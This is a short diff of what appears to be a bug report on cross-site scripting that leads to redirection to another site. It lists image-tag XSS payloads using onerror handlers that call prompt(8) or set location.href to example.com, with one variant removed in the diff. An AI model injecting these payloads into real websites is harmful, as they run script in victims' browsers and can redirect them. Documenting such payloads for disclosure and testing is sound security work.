@@ -23,8 +23,6 @@ Redirection to  different site
 
 2)<img src/onerror=prompt(8)>
 
-3)<img src =q onerror=prompt(8)> 
-
 4)<img src=q onerror=location.href = "https://www.example.com";>
 
 # Impact 
